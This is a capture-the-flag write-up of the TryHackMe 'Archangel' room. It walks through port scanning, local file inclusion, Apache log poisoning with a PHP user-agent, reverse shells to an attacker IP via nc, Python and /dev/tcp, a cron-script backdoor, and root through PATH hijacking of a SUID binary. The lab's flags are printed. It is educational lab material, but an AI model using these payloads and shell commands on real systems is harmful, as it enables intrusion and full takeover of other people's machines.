@@ -1,0 +1,184 @@
+So today we are going to solve another Challenge from TryHackMe which is listed as an Easy named Archangel.
+
+
+Main IP :: 10.48.140.150
+
+We got the main IP and we will start with the full port scan.
+
+Nmap scan report for ip-10-48-140-150.ap-south-1.compute.internal (10.48.140.150)
+Host is up (0.00034s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+we get this so let's run service and version scan.
+
+Nmap scan report for ip-10-48-140-150.ap-south-1.compute.internal (10.48.140.150)
+Host is up, received echo-reply ttl 64 (0.00039s latency).
+Scanned at 2026-05-20 05:22:45 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
+|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
+|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Wavefire
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+So starting with port 80 looking what it has and what can be done.
+
+So running ffuf scan and found out /flags,/pages/,images and layout 
+
+visiting each one by one.
+
+Send us a mail:
+support@mafialive.thm
+ 
+so we this and this domain is different than for this room as email let's add it in /etc/hosts and try to visit it
+
+and see what it has.
+
+and visiting mafialive.thm
+
+UNDER DEVELOPMENT
+thm{f0und_th3_r1ght_h0st_n4m3} gives us this.
+
+So now using ffuf on to the mafialive.thm get us robots.txt visiting it gives us disallow: test.php
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
+
+we can see that visiting test.php has button and clicking it get's us over at this url 
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log trying this gives us
+
+Test Page. Not to be Deployed
+
+10.48.71.47 - - [20/May/2026:11:04:10 +0530] "GET /test.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" 10.48.71.47 - - [20/May/2026:11:04:12 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" 10.48.71.47 - - [20/May/2026:11:04:27 +0530] "GET /test.php?view=/etc/passwd HTTP/1.1" 200 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" 10.48.71.47 - - [20/May/2026:11:04:38 +0530] "GET /test.php?view=%22ls%20-lah%22 HTTP/1.1" 200 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36" 192.168.145.49 - - [20/May/2026:11:08:13 +0530] "GET /test.php HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:08:13 +0530] "GET /favicon.ico HTTP/1.1" 404 491 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:08:15 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:08:39 +0530] "GET /test.php?view=../../../../../../../etc/passwd HTTP/1.1" 200 489 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:08:41 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php?view=../../../../../../../etc/passwd" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:08:42 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 485 "http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:08:47 +0530] "GET /test.php?view=/var/www/html/development_testing HTTP/1.1" 200 472 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:09:01 +0530] "GET /test.php?view=ls%20/var/www/html/development_testing HTTP/1.1" 200 473 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:10:33 +0530] "GET /test.php?view=%3C?php%20exec(%E2%80%98rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&1|nc%20192.168.145.49%204444%20%3E/tmp/f%E2%80%99)%20?%3E HTTP/1.1" 200 489 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 192.168.145.49 - - [20/May/2026:11:13:04 +0530] "GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1" 200 486 "http://mafialive.thm/test.php?view=%3C?php%20exec(%E2%80%98rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E&1|nc%20192.168.145.49%204444%20%3E/tmp/f%E2%80%99)%20?%3E" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" 
+
+<?php exec(‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.145.49 4444 >/tmp/f’) ?>
+Press enter or click to view image in full size
+
+and create nc -lvnp 4444
+
+so let's check for LFI.
+
+Moving forward
+
+kali㉿kali)-[~]
+└─$ curl -A "<?php system(\$_GET['cmd']); ?>" "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.145.49%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fsh%22%29%27"
+
+<!DOCTYPE HTML>
+
+with this we have the  shell.
+ nc -lvnp 4444   
+Listening on 0.0.0.0 4444
+Connection received on 10.48.183.109 33288
+$ whoami
+whoami
+www-data
+
+www-data
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/development_testing$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                      
+┌──(root㉿kali)-[/home/kali/thm/archangel]
+└─# stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+
+www-data@ubuntu:/var/www/html/development_testing$ export TERM=xterm-256color
+www-data@ubuntu:/var/www/html/development_testing$ 
+
+
+Shell stabilized.
+
+Now moving to home we will find 2flag 
+
+So we can see in
+
+sh -i >& /dev/tcp/192.168.145.49/4445 0>&1 
+addingthis in to /opt/helloworld.sh 
+
+ nc -lvnp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.48.183.109 48222
+sh: 0: can't access tty; job control turned off
+$ 
+
+we get the shell.
+
+
+backup  user2.txt
+archangel@ubuntu:~/secret$ cat user2.txt
+cat user2.txt
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+archangel@ubuntu:~/secret$ ls
+ls
+backup  user2.txt
+archangel@ubuntu:~/secret$ ls -lah
+ls -lah
+total 32K
+drwxrwx--- 2 archangel archangel 4.0K Nov 19  2020 .
+drwxr-xr-x 6 archangel archangel 4.0K Nov 20  2020 ..
+-rwsr-xr-x 1 root      root       17K Nov 18  2020 backup
+-rw-r--r-- 1 root      root        49 Nov 19  2020 user2.txt
+archangel@ubuntu:~/secret$ 
+
+
+doing strings backup 
+
+find us
+
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+
+PRIVILEGE ESCALATION
+
+/tmp$ echo "/bin/bash" > /tmp/cp
+archangel@ubuntu:/tmp$ chmod 777 /tmp/cp
+archangel@ubuntu:/tmp$ export PATH=/tmp/:$PATH
+archangel@ubuntu:/tmp$ /home/archangel/
+.cache/  .local/  myfiles/ secret/  
+archangel@ubuntu:/tmp$ /home/archangel/
+.cache/  .local/  myfiles/ secret/  
+archangel@ubuntu:/tmp$ /home/archangel/secret/
+backup  cp      cp.c    
+archangel@ubuntu:/tmp$ /home/archangel/secret/./backup 
+root@ubuntu:/tmp# 
+
+
+
+root@ubuntu:/var/www/html/development_testing# cat test.php 
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>INCLUDE</title>
+    <h1>Test Page. Not to be Deployed</h1>
+ 
+    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
+        <?php
+
+            //FLAG: thm{explo1t1ng_lf1}
+
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+
+get's us all flag.
+
+
+
+
+
+
